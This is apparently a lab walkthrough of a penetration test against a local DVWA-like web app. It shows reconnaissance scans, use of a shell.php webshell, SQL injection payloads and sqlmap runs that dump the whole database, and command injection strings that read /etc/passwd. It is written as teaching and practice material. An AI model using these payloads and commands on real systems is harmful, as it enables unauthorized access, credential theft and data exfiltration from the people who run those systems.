# Exploiting Known Vulnerabilities



## What is Vulnerability Exploitation?
Vulnerability exploitation is the process of identifying security weaknesses in systems, applications, or networks and using them to gain unauthorized access, escalate privileges, or disrupt services.
Key Concepts
  - CVE (Common Vulnerabilities and Exposures): Standardized identifiers for vulnerabilities
  - CVSS (Common Vulnerability Scoring System): Severity scoring system (0-10)
  - Zero-day: Unknown vulnerability with no patch available
  - N-day: Known vulnerability with patches available
  - Exploit: Code or technique that leverages a vulnerability
  - Payload: Malicious code executed after successful exploitation



# Exploiting Known Vulnerabilities Methodology


## 1. COMPREHENSIVE INFORMATION GATHERING

### Network Discovery & Service Enumeration

#### Scan
````
nmap -sS -sV -sC -O -p- 192.168.100.97
````

#### UDP service discovery
````
nmap -sU -p 53,67,68,69,123,161,162 192.168.100.97
````
<img width="542" height="303" alt="image" src="https://github.com/user-attachments/assets/686783bd-3fe1-46dd-b8af-3e1a368d9b7f" />


#### Vulnerability script scanning
````
nmap --script vuln 192.168.100.97 -p 8080
````
<img width="721" height="446" alt="image" src="https://github.com/user-attachments/assets/005ef93a-e454-4e77-b6bf-b2c096de604e" />



### Advanced Web Application Fingerprinting

#### hatWeb for detailed technology identification
````
ruby whatweb -a 3 http://192.168.100.97:8080
````
<img width="1909" height="149" alt="image" src="https://github.com/user-attachments/assets/be0ba680-6e99-4ef8-bef6-f73b625cd20c" />

- in this my machine use with `Ruby`. IF normal use `whatweb -a 3 http://192.168.100.97:8080`.

#### Nikto for vulnerability scanning
````
nikto -h http://192.168.100.97:8080
````
<img width="1181" height="464" alt="image" src="https://github.com/user-attachments/assets/b2050727-5408-452e-a0ef-9315f0716dda" />



### Directory and File Bruteforcing

#### directory scanning
````
gobuster dir -u http://192.168.100.97:8080/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,js,bak,old,backup
````
<img width="852" height="813" alt="image" src="https://github.com/user-attachments/assets/1e8f22a7-a670-4e28-bf91-ccd466bbd60e" />

- This we can get shell like: http://192.168.100.97:8080/shell.php
<img width="1067" height="201" alt="image" src="https://github.com/user-attachments/assets/ae78e9ff-8cd9-4b29-9a31-ffdace55d6d3" />

<img width="1092" height="397" alt="image" src="https://github.com/user-attachments/assets/9ab5181a-b486-493a-aadd-e008787a318b" />


````
http://192.168.100.97:8080/shell.php?cmd=id
````
<img width="1089" height="208" alt="image" src="https://github.com/user-attachments/assets/61e4901b-49a7-4fe9-8366-4b810ac70a33" />


#### Subdomain Enumeration
````
gobuster dir -u http://192.168.100.97:8080 -w /usr/share/wordlists/dirb/common.txt
````
<img width="811" height="539" alt="image" src="https://github.com/user-attachments/assets/f6398246-f6b1-480a-b866-dff076984a8d" />



---

## Session Hijacking & Analysis
### Console 
````
console.log("Cookies:", document.cookie);
````
- In this first go to our browser -> First press `F12` or `Inspect`:
<img width="1918" height="700" alt="image" src="https://github.com/user-attachments/assets/64465a6f-3676-43e3-8e2d-7f1c667c4ed7" />


### Check security level:
````
console.log("Security Level:", getSecurityLevel());
````
<img width="1925" height="675" alt="image" src="https://github.com/user-attachments/assets/7b0d6b03-6411-4201-8d3a-b74313805e38" />


---



## SQL INJECTION EXPLOITATION

### Manual SQL Injection with Advanced Techniques

#### Detect Injection point
````
' OR '1'='1
````
<img width="894" height="623" alt="image" src="https://github.com/user-attachments/assets/965cdcfe-25ed-479d-8e90-5c0bd5c03f75" />




#### Union-based data extraction
````
' UNION SELECT 1,2,3-- -
````
<img width="1314" height="303" alt="image" src="https://github.com/user-attachments/assets/69956c25-5d9d-49b7-b9ce-e11cceab4b9e" />


### Automated SQL Injection with SQLMap
- First in this i need to check target `Session Cookie` -> First Press `F12` or `Inspect`:
<img width="1918" height="654" alt="image" src="https://github.com/user-attachments/assets/b7ff3771-3b3a-47e8-892c-c91ea78e4fea" />


<img width="1920" height="652" alt="image" src="https://github.com/user-attachments/assets/b18f5b49-2e17-47bb-9979-bcd6736c15dc" />


#### SQLMAP Scan
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=at6q3m4gnge0b3i4bp1tkpmbq3; security=low" --batch --risk=3 --level=5
````
<img width="1681" height="701" alt="image" src="https://github.com/user-attachments/assets/ce6bc6b2-52bb-4118-af0c-60f7807023a5" />

- All of these `Payload` we can use for `SQLi`:
````
1' AND (SELECT 8356 FROM (SELECT(SLEEP(5)))tgNW)-- MDmE&Submit=Submit
````
<img width="1118" height="786" alt="image" src="https://github.com/user-attachments/assets/6614d800-9324-48f4-9107-45de39addb91" />


#### Get database banner
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=at6q3m4gnge0b3i4bp1tkpmbq3; security=low" --banner
````
<img width="1673" height="742" alt="image" src="https://github.com/user-attachments/assets/a62904a8-4f60-442e-b6a6-d853a1af13f6" />


#### Dump entire database
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=at6q3m4gnge0b3i4bp1tkpmbq3; security=low" --dump-all --batch
````
<img width="1679" height="777" alt="image" src="https://github.com/user-attachments/assets/8031b4a4-7afd-4f5a-8b53-9e30a6e4b7af" />

<img width="1498" height="808" alt="image" src="https://github.com/user-attachments/assets/805df4b6-3561-48a2-9fd3-6eb629e127e4" />

- All of these `username` and `password` we can login:
<img width="1307" height="205" alt="image" src="https://github.com/user-attachments/assets/d82cc1a5-65fb-45e2-addf-eaa97acb0a5d" />

<img width="503" height="415" alt="image" src="https://github.com/user-attachments/assets/ed25df90-b975-43d2-b358-765cdd55b841" />

<img width="1349" height="754" alt="image" src="https://github.com/user-attachments/assets/e133f6b4-5b49-4736-b6af-a30be63d3cc1" />

---



## COMMAND INJECTION TO METASPLOIT

### Manual Command Injection

#### Basic 
````
8.8.8.8; whoami
````
<img width="804" height="643" alt="image" src="https://github.com/user-attachments/assets/47eeef0e-4b6f-40b2-b4b6-7725ec02177a" />

<img width="801" height="637" alt="image" src="https://github.com/user-attachments/assets/ce5592c3-8eb2-4251-9f6d-dd4050ae0b5d" />


````
8.8.8.8 && id
````
<img width="816" height="441" alt="image" src="https://github.com/user-attachments/assets/d0c4f429-5619-4398-a94c-f8546b2c2094" />

````
8.8.8.8 | cat /etc/passwd
````
<img width="813" height="449" alt="image" src="https://github.com/user-attachments/assets/71c7aa44-f869-4a98-a715-0aaf19cc220c" />



----























